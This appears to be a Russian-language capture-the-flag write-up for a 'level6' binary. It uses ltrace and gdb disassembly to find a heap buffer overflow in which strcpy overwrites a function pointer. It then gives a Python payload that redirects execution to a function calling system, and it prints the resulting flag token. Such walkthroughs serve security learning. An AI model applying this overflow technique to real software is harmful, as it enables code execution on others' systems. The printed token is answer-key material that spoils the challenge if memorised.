1) Глянем вызовы
	ltrace ./level6 test
	__libc_start_main(0x804847c, 2, 0xbffff7b4, 0x80484e0, 0x8048550 <unfinished ...>
	malloc(64)                                                                           = 0x0804a008
	malloc(4)                                                                            = 0x0804a050
	strcpy(0x0804a008, "test")                                                           = 0x0804a008
	puts("Nope"Nope
	)                                                                         = 5
	+++ exited (status 5) +++

	Здесь вызываются два выделения памяти
	между первым вделением и вторым 0x0804a050 - 0x0804a008 = 72 байта
	после этого вызывается strcpy начиная с адреса первого вделения
2) Дизассемблируем функции

	gdb level6

	i func
	...
	0x08048454  n
	0x08048468  m
	0x0804847c  main
	...

	(gdb) disas main
	0x0804847c <+0>:	push   %ebp
	0x0804847d <+1>:	mov    %esp,%ebp
	0x0804847f <+3>:	and    $0xfffffff0,%esp
	0x08048482 <+6>:	sub    $0x20,%esp
	0x08048485 <+9>:	movl   $0x40,(%esp)
	0x0804848c <+16>:	call   0x8048350 <malloc@plt>
	0x08048491 <+21>:	mov    %eax,0x1c(%esp)
	0x08048495 <+25>:	movl   $0x4,(%esp)
	0x0804849c <+32>:	call   0x8048350 <malloc@plt>
	0x080484a1 <+37>:	mov    %eax,0x18(%esp)
	0x080484a5 <+41>:	mov    $0x8048468,%edx
	0x080484aa <+46>:	mov    0x18(%esp),%eax
	0x080484ae <+50>:	mov    %edx,(%eax)
	0x080484b0 <+52>:	mov    0xc(%ebp),%eax
	0x080484b3 <+55>:	add    $0x4,%eax
	0x080484b6 <+58>:	mov    (%eax),%eax
	0x080484b8 <+60>:	mov    %eax,%edx
	0x080484ba <+62>:	mov    0x1c(%esp),%eax
	0x080484be <+66>:	mov    %edx,0x4(%esp)
	0x080484c2 <+70>:	mov    %eax,(%esp)
	0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
	0x080484ca <+78>:	mov    0x18(%esp),%eax
	0x080484ce <+82>:	mov    (%eax),%eax
	0x080484d0 <+84>:	call   *%eax
	0x080484d2 <+86>:	leave
	0x080484d3 <+87>:	ret

	(gdb) disas m
	0x08048468 <+0>:	push   %ebp
	0x08048469 <+1>:	mov    %esp,%ebp
	0x0804846b <+3>:	sub    $0x18,%esp
	0x0804846e <+6>:	movl   $0x80485d1,(%esp)
	0x08048475 <+13>:	call   0x8048360 <puts@plt>
	0x0804847a <+18>:	leave
	0x0804847b <+19>:	ret

	(gdb) disas n
	0x08048454 <+0>:	push   %ebp
	0x08048455 <+1>:	mov    %esp,%ebp
	0x08048457 <+3>:	sub    $0x18,%esp
	0x0804845a <+6>:	movl   $0x80485b0,(%esp)
	0x08048461 <+13>:	call   0x8048370 <system@plt>
	0x08048466 <+18>:	leave
	0x08048467 <+19>:	ret

	Нам необходимо взывать функцию n, так как вызов системной sh находится в нем.
3)
	Запустим скрипт на питоне python -c "print 72*'a' + '\x54\x84\x04\x08'" > /tmp/lvl6
	'\x54\x84\x04\x08' - адрес функции n

	Передадим на вход файл
	./level6 `cat /tmp/lvl6`

	Получили токен
	f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
